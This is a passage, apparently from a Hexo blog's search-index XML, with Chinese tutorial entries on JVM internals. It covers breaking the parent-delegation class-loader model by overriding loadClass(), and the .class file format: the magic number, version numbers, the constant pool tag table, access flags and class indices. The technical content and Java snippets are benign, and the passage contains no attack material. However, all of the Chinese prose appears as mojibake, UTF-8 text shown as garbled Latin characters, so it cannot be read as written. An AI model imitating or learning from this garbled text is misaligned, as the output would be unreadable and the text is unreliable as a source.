è½½ï¼Œè€Œ <code>ExtClassLoader</code> åˆä¼šå§”æ‰˜ç»™ <code>BootstrapClassLoader</code>ï¼Œ<code>BootstrapClassLoader</code> å‘ç°è‡ªå·±å·²ç»åŠ è½½è¿‡äº† <code>Object</code> ç±»ï¼Œä¼šç›´æ¥è¿”å›ï¼Œä¸ä¼šå»åŠ è½½ä½ å†™çš„ <code>Object</code> ç±»ã€‚</p><h4 id="æ‰“ç ´åŒäº²å§”æ´¾æ¨¡å‹æ–¹æ³•"><a href="#æ‰“ç ´åŒäº²å§”æ´¾æ¨¡å‹æ–¹æ³•" class="headerlink" title="æ‰“ç ´åŒäº²å§”æ´¾æ¨¡å‹æ–¹æ³•"></a>æ‰“ç ´åŒäº²å§”æ´¾æ¨¡å‹æ–¹æ³•</h4><p>æ‰“ç ´åŒäº²å§”æ´¾æ¨¡å‹æ–¹æ³•å°±è¦<strong>è‡ªå®šä¹‰åŠ è½½å™¨,é‡å†™loadClassæ–¹æ³•</strong>. è‡ªå®šä¹‰åŠ è½½å™¨çš„è¯ï¼Œéœ€è¦ç»§æ‰¿ <code>ClassLoader</code> ã€‚å¦‚æœæˆ‘ä»¬ä¸æƒ³æ‰“ç ´åŒäº²å§”æ´¾æ¨¡å‹ï¼Œå°±é‡å†™ <code>ClassLoader</code> ç±»ä¸­çš„ findClass() æ–¹æ³•å³å¯ï¼Œæ— æ³•è¢«çˆ¶ç±»åŠ è½½å™¨åŠ è½½çš„ç±»æœ€ç»ˆä¼šé€šè¿‡è¿™ä¸ªæ–¹æ³•è¢«åŠ è½½ã€‚ä½†æ˜¯ï¼Œå¦‚æœæƒ³æ‰“ç ´åŒäº²å§”æ´¾æ¨¡å‹åˆ™éœ€è¦é‡å†™ loadClass() æ–¹æ³•ã€‚</p><p>ä¸ºä»€ä¹ˆæ˜¯é‡å†™ loadClass() æ–¹æ³•æ‰“ç ´åŒäº²å§”æ´¾æ¨¡å‹å‘¢ï¼ŸåŒäº²å§”æ´¾æ¨¡å‹çš„æ‰§è¡Œæµç¨‹å·²ç»è§£é‡Šäº†ï¼š</p><blockquote><p>ç±»åŠ è½½å™¨åœ¨è¿›è¡Œç±»åŠ è½½çš„æ—¶å€™ï¼Œå®ƒé¦–å…ˆä¸ä¼šè‡ªå·±å»å°è¯•åŠ è½½è¿™ä¸ªç±»ï¼Œè€Œæ˜¯æŠŠè¿™ä¸ªè¯·æ±‚å§”æ´¾ç»™çˆ¶ç±»åŠ è½½å™¨å»å®Œæˆï¼ˆè°ƒç”¨çˆ¶åŠ è½½å™¨ loadClass()æ–¹æ³•æ¥åŠ è½½ç±»ï¼‰ã€‚</p></blockquote><p>é‡å†™ loadClass()æ–¹æ³•ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥æ”¹å˜ä¼ ç»ŸåŒäº²å§”æ´¾æ¨¡å‹çš„æ‰§è¡Œæµç¨‹ã€‚ä¾‹å¦‚ï¼Œå­ç±»åŠ è½½å™¨å¯ä»¥åœ¨å§”æ´¾ç»™çˆ¶ç±»åŠ è½½å™¨ä¹‹å‰ï¼Œå…ˆè‡ªå·±å°è¯•åŠ è½½è¿™ä¸ªç±»ï¼Œæˆ–è€…åœ¨çˆ¶ç±»åŠ è½½å™¨è¿”å›ä¹‹åï¼Œå†å°è¯•ä»å…¶ä»–åœ°æ–¹åŠ è½½è¿™ä¸ªç±»ã€‚å…·ä½“çš„è§„åˆ™ç”±æˆ‘ä»¬è‡ªå·±å®ç°ï¼Œæ ¹æ®é¡¹ç›®éœ€æ±‚å®šåˆ¶åŒ–ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç±»æ–‡ä»¶ç»“æ„</title>
      <link href="/2023/12/20/JVM3/"/>
      <url>/2023/12/20/JVM3/</url>
      
        <content type="html"><![CDATA[<h2 id="ç±»æ–‡ä»¶ç»“æ„"><a href="#ç±»æ–‡ä»¶ç»“æ„" class="headerlink" title="ç±»æ–‡ä»¶ç»“æ„"></a>ç±»æ–‡ä»¶ç»“æ„</h2><p>åœ¨æˆ‘ä»¬å­¦ä¹ Cè¯­è¨€çš„æ—¶å€™ï¼Œæˆ‘ä»¬çš„ç¼–ç¨‹è¿‡ç¨‹ä¼šç»å†å¦‚ä¸‹å‡ ä¸ªé˜¶æ®µï¼šå†™ä»£ç ã€ä¿å­˜ã€ç¼–è¯‘ã€è¿è¡Œã€‚å®é™…ä¸Šï¼Œæœ€å…³é”®çš„ä¸€æ­¥æ˜¯ç¼–è¯‘ï¼Œå› ä¸ºåªæœ‰ç»å†äº†ç¼–è¯‘ä¹‹åï¼Œæˆ‘ä»¬æ‰€ç¼–å†™çš„ä»£ç æ‰èƒ½å¤Ÿç¿»è¯‘ä¸ºæœºå™¨å¯ä»¥ç›´æ¥è¿è¡Œçš„äºŒè¿›åˆ¶ä»£ç ï¼Œå¹¶ä¸”åœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿä¸‹ï¼Œæˆ‘ä»¬çš„ä»£ç éƒ½éœ€è¦è¿›è¡Œä¸€æ¬¡ç¼–è¯‘ä¹‹åæ‰èƒ½è¿è¡Œã€‚</p><blockquote><p>å¦‚æœå…¨ä¸–ç•Œæ‰€æœ‰çš„è®¡ç®—æœºæŒ‡ä»¤é›†åªæœ‰x86ä¸€ç§ï¼Œæ“ä½œç³»ç»Ÿåªæœ‰Windowsä¸€ç§ï¼Œé‚£ä¹Ÿè®¸å°±ä¸ä¼šæœ‰Javaè¯­è¨€çš„å‡ºç°ã€‚</p></blockquote><p>éšç€æ—¶ä»£çš„å‘å±•ï¼Œäººä»¬è¿«åˆ‡å¸Œæœ›èƒ½å¤Ÿåœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿã€ä¸åŒçš„è®¡ç®—æœºæ¶æ„ä¸­è¿è¡ŒåŒä¸€å¥—ç¼–è¯‘ä¹‹åçš„ä»£ç ã€‚æœ¬åœ°ä»£ç ä¸åº”è¯¥æ˜¯æˆ‘ä»¬ç¼–ç¨‹çš„å”¯ä¸€é€‰æ‹©ï¼Œæ‰€ä»¥ï¼Œè¶Šæ¥è¶Šå¤šçš„è¯­è¨€é€‰æ‹©äº†ä¸æ“ä½œç³»ç»Ÿå’Œæœºå™¨æŒ‡ä»¤é›†æ— å…³çš„ä¸­ç«‹æ ¼å¼ä½œä¸ºç¼–è¯‘åçš„å­˜å‚¨æ ¼å¼ã€‚</p><p>â€œä¸€æ¬¡ç¼–å†™ï¼Œåˆ°å¤„è¿è¡Œâ€ï¼ŒJavaæœ€å¼•ä»¥ä¸ºå‚²çš„å£å·ï¼Œæ ‡å¿—ç€å¹³å°ä¸å†æ˜¯é™åˆ¶ç¼–ç¨‹è¯­è¨€çš„é˜»ç¢ã€‚</p><p>å®é™…ä¸Šï¼ŒJavaæ­£å¼åˆ©ç”¨äº†è¿™æ ·çš„è§£å†³æ–¹æ¡ˆï¼Œå°†æºä»£ç ç¼–è¯‘ä¸ºå¹³å°æ— å…³çš„ä¸­é—´æ ¼å¼ï¼Œå¹¶é€šè¿‡å¯¹åº”çš„Javaè™šæ‹Ÿæœºè¯»å–å’Œè¿è¡Œè¿™äº›ä¸­é—´æ ¼å¼çš„ç¼–è¯‘æ–‡ä»¶ï¼Œè¿™æ ·ï¼Œæˆ‘ä»¬åªéœ€è¦è€ƒè™‘ä¸åŒå¹³å°çš„è™šæ‹Ÿæœºå¦‚ä½•ç¼–å†™ï¼Œè€ŒJavaè¯­è¨€æœ¬èº«å¾ˆè½»æ¾åœ°å®ç°äº†è·¨å¹³å°ã€‚</p><p>ç°åœ¨ï¼Œè¶Šæ¥è¶Šå¤šçš„å¼€å‘è¯­è¨€éƒ½æ”¯æŒå°†æºä»£ç ç¼–è¯‘ä¸º<code>.class</code>å­—èŠ‚ç æ–‡ä»¶æ ¼å¼ï¼Œä»¥ä¾¿èƒ½å¤Ÿç›´æ¥äº¤ç»™JVMè¿è¡Œï¼ŒåŒ…æ‹¬Kotlinï¼ˆå®‰å“å¼€å‘å®˜æ–¹æŒ‡å®šè¯­è¨€ï¼‰ã€Groovyã€Scalaç­‰ã€‚</p><p><img src="https://pb01.s3.bitiful.net/129.png" alt="avatar"></p><p>é‚£ä¹ˆï¼Œè®©æˆ‘ä»¬æ¥çœ‹çœ‹ï¼Œæˆ‘ä»¬çš„æºä»£ç ç¼–è¯‘ä¹‹åï¼Œæ˜¯å¦‚ä½•ä¿å­˜åœ¨å­—èŠ‚ç æ–‡ä»¶ä¸­çš„ã€‚</p><hr><h3 id="ç±»æ–‡ä»¶ä¿¡æ¯"><a href="#ç±»æ–‡ä»¶ä¿¡æ¯" class="headerlink" title="ç±»æ–‡ä»¶ä¿¡æ¯"></a>ç±»æ–‡ä»¶ä¿¡æ¯</h3><p>æˆ‘ä»¬ä¹‹å‰éƒ½æ˜¯ä½¿ç”¨<code>javap</code>å‘½ä»¤æ¥å¯¹å­—èŠ‚ç æ–‡ä»¶è¿›è¡Œåç¼–è¯‘æŸ¥çœ‹çš„ï¼Œé‚£ä¹ˆï¼Œå®ƒä»¥äºŒè¿›åˆ¶æ ¼å¼æ˜¯æ€ä¹ˆä¿å­˜å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥ä½¿ç”¨WinHexè½¯ä»¶ï¼ˆMacå¹³å°å¯ä»¥ä½¿ç”¨<a href="https://www.macwk.com/soft/010-editor">010 Editor</a>ï¼‰æ¥ä»¥åå…­è¿›åˆ¶æŸ¥çœ‹å­—èŠ‚ç æ–‡ä»¶ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> i++;</span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> ++i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°æˆ‘ä»¬åœ¨IDEAä¸­ç¼–è¯‘å‡ºæ¥çš„classæ–‡ä»¶ï¼Œå°†å…¶æ‹–åŠ¨è¿›å»ï¼š</p><p><img src="https://pb01.s3.bitiful.net/130.png" alt="avatar"></p><p>å¯ä»¥çœ‹åˆ°æ•´ä¸ªæ–‡ä»¶ä¸­ï¼Œå…¨æ˜¯ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚åˆ†ç»„çš„æ ·å­ï¼Œä»å·¦ä¸Šè§’å¼€å§‹ï¼Œä¸€è¡Œä¸€è¡Œå‘ä¸‹è¯»å–ã€‚</p><p>å®é™…ä¸ŠClassæ–‡ä»¶é‡‡ç”¨äº†ä¸€ç§ç±»ä¼¼äºCä¸­ç»“æ„ä½“çš„ä¼ªç»“æ„æ¥å­˜å‚¨æ•°æ®:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ClassFile &#123;</span><br><span class="line">    u4             magic; //Class æ–‡ä»¶çš„æ ‡å¿—</span><br><span class="line">    u2             minor_version;//Class çš„å°ç‰ˆæœ¬å·</span><br><span class="line">    u2             major_version;//Class çš„å¤§ç‰ˆæœ¬å·</span><br><span class="line">    u2             constant_pool_count;//å¸¸é‡æ± çš„æ•°é‡</span><br><span class="line">    cp_info        constant_pool[constant_pool_count-1];//å¸¸é‡æ± </span><br><span class="line">    u2             access_flags;//Class çš„è®¿é—®æ ‡è®°</span><br><span class="line">    u2             this_class;//å½“å‰ç±»</span><br><span class="line">    u2             super_class;//çˆ¶ç±»</span><br><span class="line">    u2             interfaces_count;//æ¥å£æ•°é‡</span><br><span class="line">    u2             interfaces[interfaces_count];//ä¸€ä¸ªç±»å¯ä»¥å®ç°å¤šä¸ªæ¥å£</span><br><span class="line">    u2             fields_count;//å­—æ®µæ•°é‡</span><br><span class="line">    field_info     fields[fields_count];//ä¸€ä¸ªç±»å¯ä»¥æœ‰å¤šä¸ªå­—æ®µ</span><br><span class="line">    u2             methods_count;//æ–¹æ³•æ•°é‡</span><br><span class="line">    method_info    methods[methods_count];//ä¸€ä¸ªç±»å¯ä»¥æœ‰ä¸ªå¤šä¸ªæ–¹æ³•</span><br><span class="line">    u2             attributes_count;//æ­¤ç±»çš„å±æ€§è¡¨ä¸­çš„å±æ€§æ•°</span><br><span class="line">    attribute_info attributes[attributes_count];//å±æ€§è¡¨é›†åˆ</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è€ŒClassæ–‡ä»¶ä¸­ï¼Œæœ‰ä¸¤ç§å…è®¸å­˜åœ¨çš„æ•°æ®ç±»å‹ï¼Œä¸€ä¸ªæ˜¯æ— ç¬¦å·æ•°ï¼Œè¿˜æœ‰ä¸€ä¸ªæ˜¯è¡¨ã€‚</p><ul><li>æ— ç¬¦å·æ•°ä¸€èˆ¬æ˜¯åŸºæœ¬æ•°æ®ç±»å‹ï¼Œç”¨u1ã€u2ã€u4ã€u8æ¥è¡¨ç¤ºï¼Œè¡¨ç¤º1ä¸ªå­—èŠ‚~8ä¸ªå­—èŠ‚çš„æ— ç¬¦å·æ•°ã€‚å¯ä»¥è¡¨ç¤ºæ•°å­—ã€ç´¢å¼•å¼•ç”¨ã€æ•°é‡å€¼æˆ–æ˜¯ä»¥UTF-8ç¼–ç æ ¼å¼çš„å­—ç¬¦ä¸²ã€‚</li><li>è¡¨åŒ…å«å¤šä¸ªæ— ç¬¦å·æ•°ï¼Œå¹¶ä¸”ä»¥â€_infoâ€ç»“å°¾ã€‚</li></ul><p>æˆ‘ä»¬é¦–å…ˆä»æœ€ç®€å•çš„å¼€å§‹çœ‹èµ·ã€‚</p><p><img src="https://pb01.s3.bitiful.net/131.png" alt="avatar"></p><p>é¦–å…ˆï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå‰4ä¸ªå­—èŠ‚ï¼ˆå…±32ä½ï¼‰ç»„æˆäº†<strong>é­”æ•°</strong>ï¼ˆå…¶å®å°±æ˜¯è¡¨ç¤ºè¿™ä¸ªæ–‡ä»¶æ˜¯ä¸€ä¸ªJVMå¯ä»¥è¿è¡Œçš„å­—èŠ‚ç æ–‡ä»¶ï¼Œé™¤äº†Javaä»¥å¤–ï¼Œå…¶ä»–æŸäº›æ–‡ä»¶ä¸­ä¹Ÿé‡‡ç”¨äº†è¿™ç§é­”æ•°æœºåˆ¶æ¥è¿›è¡ŒåŒºåˆ†ï¼Œè¿™ç§æ–¹å¼æ¯”ç›´æ¥èµ·ä¸ªæ–‡ä»¶æ‰©å±•åæ›´å®‰å…¨ï¼‰</p><p>å­—èŠ‚ç æ–‡ä»¶çš„é­”æ•°ä¸ºï¼šCAFEBABEï¼ˆè¿™åå­—èƒ½æƒ³å‡ºæ¥ä¹Ÿæ˜¯æŒºéš¾çš„äº†ï¼Œæ¯•ç«Ÿ4ä¸ªbitä½åªèƒ½è¡¨ç¤ºå‡ºA-Fè¿™å‡ ä¸ªå­—æ¯ï¼‰</p><p>ç´§æ¥ç€é­”æ•°çš„åé¢4ä¸ªå­—èŠ‚å­˜å‚¨çš„æ˜¯å­—èŠ‚ç æ–‡ä»¶çš„ç‰ˆæœ¬å·ï¼Œæ³¨æ„å‰ä¸¤ä¸ªæ˜¯æ¬¡è¦ç‰ˆæœ¬å·ï¼ˆç°åœ¨åŸºæœ¬éƒ½ä¸ç”¨äº†ï¼Œéƒ½æ˜¯ç›´æ¥Java8ã€Java9è¿™æ ·å‘½åäº†ï¼‰ï¼Œåé¢ä¸¤ä¸ªæ˜¯<strong>ä¸»è¦ç‰ˆæœ¬å·</strong>ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸»è¦çœ‹ä¸»ç‰ˆæœ¬å·ï¼Œæ¯”å¦‚ä¸Šé¢çš„å°±æ˜¯34ï¼Œæ³¨æ„è¿™æ˜¯ä»¥16è¿›åˆ¶è¡¨ç¤ºçš„ï¼Œæˆ‘ä»¬æŠŠå®ƒæ¢ç®—ä¸º10è¿›åˆ¶åï¼Œå¾—åˆ°çš„ç»“æœä¸ºï¼š<code>34  -&gt;  3*16 + 4 = 52</code>ï¼Œå…¶ä¸­<code>52</code>ä»£è¡¨çš„æ˜¯<code>JDK8</code>ç¼–è¯‘çš„å­—èŠ‚ç æ–‡ä»¶ï¼ˆ51æ˜¯JDK7ã€50æ˜¯JDK6ã€53æ˜¯JDK9ï¼Œä»¥æ­¤ç±»æ¨ï¼‰</p><p>JVMä¼š<strong>æ ¹æ®ç‰ˆæœ¬å·å†³å®šæ˜¯å¦èƒ½å¤Ÿè¿è¡Œ</strong>ï¼Œæ¯”å¦‚JDK6åªèƒ½æ”¯æŒç‰ˆæœ¬å·ä¸º1.1~6çš„ç‰ˆæœ¬ï¼Œä¹Ÿå°±æ˜¯è¯´å¿…é¡»æ˜¯Java6ä¹‹å‰çš„ç¯å¢ƒç¼–è¯‘å‡ºæ¥çš„å­—èŠ‚ç æ–‡ä»¶ï¼Œå¦åˆ™æ— æ³•è¿è¡Œã€‚åˆæ¯”å¦‚æˆ‘ä»¬ç°åœ¨å®‰è£…çš„æ˜¯JDK8ç‰ˆæœ¬ï¼Œå®ƒèƒ½å¤Ÿæ”¯æŒçš„ç‰ˆæœ¬å·ä¸º1.1~8ï¼Œé‚£ä¹ˆå¦‚æœè¿™æ—¶æˆ‘ä»¬æœ‰ä¸€ä¸ªé€šè¿‡Java7ç¼–è¯‘å‡ºæ¥çš„å­—èŠ‚ç æ–‡ä»¶ï¼Œä¾ç„¶æ˜¯å¯ä»¥è¿è¡Œçš„ï¼Œæ‰€ä»¥è¯´Javaç‰ˆæœ¬æ˜¯å‘ä¸‹å…¼å®¹çš„ã€‚</p><p>ç´§æ¥ç€ï¼Œå°±æ˜¯ç±»çš„<strong>å¸¸é‡æ± </strong>äº†ï¼Œè¿™é‡Œé¢å­˜æ”¾äº†ç±»ä¸­æ‰€æœ‰çš„å¸¸é‡ä¿¡æ¯ï¼ˆæ³¨æ„è¿™é‡Œçš„å¸¸é‡å¹¶ä¸æ˜¯æŒ‡æˆ‘ä»¬æ‰‹åŠ¨åˆ›å»ºçš„finalç±»å‹å¸¸é‡ï¼Œè€Œæ˜¯ç¨‹åºè¿è¡Œä¸€äº›éœ€è¦ç”¨åˆ°çš„å¸¸é‡æ•°æ®ï¼Œæ¯”å¦‚å­—é¢é‡å’Œç¬¦å·å¼•ç”¨ç­‰ï¼‰ç”±äºå¸¸é‡çš„æ•°é‡ä¸æ˜¯ç¡®å®šçš„ï¼Œæ‰€ä»¥åœ¨æœ€å¼€å§‹çš„ä½ç½®ä¼šå­˜æ”¾å¸¸é‡æ± ä¸­å¸¸é‡çš„æ•°é‡ï¼ˆæ˜¯ä»1å¼€å§‹è®¡ç®—çš„ï¼Œä¸æ˜¯0ï¼Œæ¯”å¦‚è¿™é‡Œæ˜¯18ï¼Œç¿»è¯‘ä¸º10è¿›åˆ¶å°±æ˜¯24ï¼Œæ‰€ä»¥å®é™…ä¸Šæœ‰23ä¸ªå¸¸é‡ï¼‰</p><p>æ¥ç€å†å¾€ä¸‹ï¼Œå°±æ˜¯å¸¸é‡æ± é‡Œé¢çš„æ•°æ®äº†ï¼Œå¸¸é‡æ± ä¸­æ¯ä¸€é¡¹å¸¸é‡éƒ½æ˜¯ä¸€ä¸ªè¡¨ï¼Œè¿™ 14 ç§è¡¨æœ‰ä¸€ä¸ªå…±åŒçš„ç‰¹ç‚¹ï¼šå¼€å§‹çš„ç¬¬ä¸€ä½æ˜¯ä¸€ä¸ª u1 ç±»å‹çš„æ ‡å¿—ä½ -tag æ¥æ ‡è¯†å¸¸é‡çš„ç±»å‹ï¼Œä»£è¡¨å½“å‰è¿™ä¸ªå¸¸é‡å±äºå“ªç§å¸¸é‡ç±»å‹,éƒ½æ˜¯ä»¥_infoç»“å°¾</p><div class="table-container"><table><thead><tr><th style="text-align:center">ç±»å‹</th><th style="text-align:center">æ ‡å¿—</th><th style="text-align:center">æè¿°</th></tr></thead><tbody><tr><td style="text-align:center">CONSTANT_Utf8_info</td><td style="text-align:center">1</td><td style="text-align:center">UTF-8ç¼–ç æ ¼å¼çš„å­—ç¬¦ä¸²</td></tr><tr><td style="text-align:center">CONSTANT_Integer_info</td><td style="text-align:center">3</td><td style="text-align:center">æ•´å½¢å­—é¢é‡ï¼ˆç¬¬ä¸€ç« æˆ‘ä»¬æ¼”ç¤ºçš„å¾ˆå¤§çš„æ•°å­—ï¼Œå®é™…ä¸Šå°±æ˜¯ä»¥å­—é¢é‡å­˜å‚¨åœ¨å¸¸é‡æ± ä¸­çš„ï¼‰</td></tr><tr><td style="text-align:center">CONSTANT_Float_info</td><td style="text-align:center">4</td><td style="text-align:center">æµ®ç‚¹å‹å­—é¢é‡</td></tr><tr><td style="text-align:center">CONSTANT_Long_info</td><td style="text-align:center">5</td><td style="text-align:center">é•¿æ•´å‹å­—é¢é‡</td></tr><tr><td style="text-align:center">CONSTANT_Double_info</td><td style="text-align:center">6</td><td style="text-align:center">åŒç²¾åº¦æµ®ç‚¹å‹å­—é¢é‡</td></tr><tr><td style="text-align:center">CONSTANT_Class_info</td><td style="text-align:center">7</td><td style="text-align:center">ç±»æˆ–æ¥å£çš„ç¬¦å·å¼•ç”¨</td></tr><tr><td style="text-align:center">CONSTANT_String_info</td><td style="text-align:center">8</td><td style="text-align:center">å­—ç¬¦ä¸²ç±»å‹çš„å­—é¢é‡</td></tr><tr><td style="text-align:center">CONSTANT_Fieldref_info</td><td style="text-align:center">9</td><td style="text-align:center">å­—æ®µçš„ç¬¦å·å¼•ç”¨</td></tr><tr><td style="text-align:center">CONSTANT_Methodref_info</td><td style="text-align:center">10</td><td style="text-align:center">æ–¹æ³•çš„ç¬¦å·å¼•ç”¨</td></tr><tr><td style="text-align:center">CONSTANT_InterfaceMethodref_info</td><td style="text-align:center">11</td><td style="text-align:center">æ¥å£æ–¹æ³•çš„ç¬¦å·å¼•ç”¨</td></tr><tr><td style="text-align:center">CONSTANT_NameAndType_info</td><td style="text-align:center">12</td><td style="text-align:center">å­—æ®µæˆ–æ–¹æ³•çš„ç¬¦å·å¼•ç”¨</td></tr><tr><td style="text-align:center">CONSTANT_MethodType_info</td><td style="text-align:center">16</td><td style="text-align:center">æ–¹æ³•ç±»å‹</td></tr><tr><td style="text-align:center">CONSTANT_MethodHandle_info</td><td style="text-align:center">15</td><td style="text-align:center">è¡¨ç¤ºæ–¹æ³•å¥æŸ„</td></tr><tr><td style="text-align:center">CONSTANT_InvokeDynamic_info</td><td style="text-align:center">18</td><td style="text-align:center">è¡¨ç¤ºä¸€ä¸ªåŠ¨æ€æ–¹æ³•è°ƒç”¨ç‚¹</td></tr></tbody></table></div><p>æ¯”å¦‚æˆ‘ä»¬æ¥çœ‹ç¬¬ä¸€ä¸ª<code>CONSTANT_Methodref_info</code>è¡¨ä¸­å­˜æ”¾äº†ä»€ä¹ˆæ•°æ®ï¼Œè¿™é‡Œæˆ‘åªåˆ—å‡ºå®ƒçš„ç»“æ„è¡¨ï¼ˆè¯¦ç»†çš„ç»“æ„è¡¨å¯ä»¥æŸ¥é˜…ã€Šæ·±å…¥ç†è§£Javaè™šæ‹Ÿæœº ç¬¬ä¸‰ç‰ˆã€‹ä¸­222é¡µæ€»è¡¨ï¼‰ï¼š</p><div class="table-container"><table><thead><tr><th style="text-align:center">å¸¸é‡</th><th style="text-align:center">é¡¹ç›®</th><th style="text-align:center">ç±»å‹</th><th style="text-align:center">æè¿°</th></tr></thead><tbody><tr><td style="text-align:center">CONSTANT_Methodref_info</td><td style="text-align:center">tag</td><td style="text-align:center">u1</td><td style="text-align:center">å€¼ä¸º10</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">index</td><td style="text-align:center">u2</td><td style="text-align:center">æŒ‡å‘å£°æ˜æ–¹æ³•çš„ç±»æè¿°çˆ¶CONSTANT_Class_infoç´¢å¼•é¡¹</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">index</td><td style="text-align:center">u2</td><td style="text-align:center">æŒ‡å‘åç§°åŠç±»å‹æè¿°ç¬¦CONSTANT_NameAndType_infoç´¢å¼•é¡¹</td></tr></tbody></table></div><p>åœ¨å¸¸é‡æ± ç»“æŸä¹‹åï¼Œç´§æ¥ç€çš„ä¸¤ä¸ªå­—èŠ‚ä»£è¡¨<strong>è®¿é—®æ ‡å¿—</strong>ï¼Œè¿™ä¸ªæ ‡å¿—ç”¨äºè¯†åˆ«ä¸€äº›ç±»æˆ–è€…æ¥å£å±‚æ¬¡çš„è®¿é—®ä¿¡æ¯ï¼ŒåŒ…æ‹¬ï¼šè¿™ä¸ª Class æ˜¯ç±»è¿˜æ˜¯æ¥å£ï¼Œæ˜¯å¦ä¸º public æˆ–è€… abstract ç±»å‹ï¼Œå¦‚æœæ˜¯ç±»çš„è¯æ˜¯å¦å£°æ˜ä¸º final ç­‰ç­‰ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u2             access_flags;//Class çš„è®¿é—®æ ‡è®°</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å®ƒåªå äº†2ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆå®ƒæ˜¯å¦‚ä½•è¡¨ç¤ºè®¿é—®æ ‡å¿—å‘¢?</p><p><img src="https://pb01.s3.bitiful.net/132.png" alt="avatar"></p><p>æ¯”å¦‚æˆ‘ä»¬è¿™é‡Œçš„Mainç±»ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ™®é€šçš„classç±»å‹ï¼Œå¹¶ä¸”è®¿é—®æƒé™ä¸ºpublicï¼Œé‚£ä¹ˆå®ƒçš„è®¿é—®æ ‡å¿—å€¼æ˜¯è¿™æ ·è®¡ç®—çš„ï¼š</p><p><code>ACC_PUBLIC | ACC_SUPER = 0x0001 | 0x0020 = 0x0021</code>ï¼ˆè¿™é‡Œè¿›è¡Œçš„æ˜¯æŒ‰ä½æˆ–è¿ç®—ï¼‰ï¼Œå¯ä»¥çœ‹åˆ°å’Œæˆ‘ä»¬ä¸Šé¢çš„ç»“æœæ˜¯ä¸€è‡´çš„ã€‚</p><p>å†å¾€ä¸‹å°±æ˜¯ç±»ç´¢å¼•ã€çˆ¶ç±»ç´¢å¼•ã€æ¥å£ç´¢å¼•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">u2             this_class;//å½“å‰ç±»</span><br><span class="line">u2             super_class;//çˆ¶ç±»</span><br><span class="line">u2             interfaces_count;//æ¥å£æ•°é‡</span><br><span class="line">u2             interfaces[interfaces_count];//ä¸€ä¸ªç±»å¯ä»¥å®ç°å¤šä¸ªæ¥å£</span><br></pre></td></tr></table></figure><p><img src="https://pb01.s3.bitiful.net/133.png" alt="avatar"></p><p>å¯ä»¥çœ‹åˆ°å®ƒä»¬çš„å€¼ä¹Ÿæ˜¯æŒ‡å‘<strong>å¸¸é‡æ± ä¸­çš„å€¼</strong>ï¼Œå…¶ä¸­2å·å¸¸é‡æ­£æ˜¯å­˜å‚¨çš„å½“å‰ç±»ä¿¡æ¯ï¼Œ3å·å¸¸é‡å­˜å‚¨çš„æ˜¯çˆ¶ç±»ä¿¡æ¯ï¼Œè¿™é‡Œå°±ä¸å†å€’æ¨å›å»äº†ï¼Œç”±äºæ²¡æœ‰æ¥å£ï¼Œæ‰€ä»¥è¿™é‡Œæ¥å£æ•°é‡ä¸º0ï¼Œå¦‚æœä¸ä¸º0è¿˜ä¼šæœ‰ä¸€ä¸ªç´¢å¼•è¡¨æ¥å¼•ç”¨æ¥å£ã€‚</p><p>Java ç±»çš„ç»§æ‰¿å…³ç³»ç”±ç±»ç´¢å¼•ã€çˆ¶ç±»ç´¢å¼•å’Œæ¥å£ç´¢å¼•é›†åˆä¸‰é¡¹ç¡®å®šã€‚ç±»ç´¢å¼•ã€çˆ¶ç±»ç´¢å¼•å’Œæ¥å£ç´¢å¼•é›†åˆæŒ‰ç…§é¡ºåºæ’åœ¨è®¿é—®æ ‡å¿—ä¹‹åï¼Œ<strong>ç±»ç´¢å¼•</strong>ç”¨äºç¡®å®šè¿™ä¸ªç±»çš„å…¨é™å®šåï¼Œ<strong>çˆ¶ç±»ç´¢å¼•</strong>ç”¨äºç¡®å®šè¿™ä¸ªç±»çš„çˆ¶ç±»çš„å…¨é™å®šåï¼Œç”±äº Java è¯­è¨€çš„å•ç»§æ‰¿ï¼Œæ‰€ä»¥çˆ¶ç±»ç´¢å¼•åªæœ‰ä¸€ä¸ªï¼Œé™¤äº† java.lang.Object 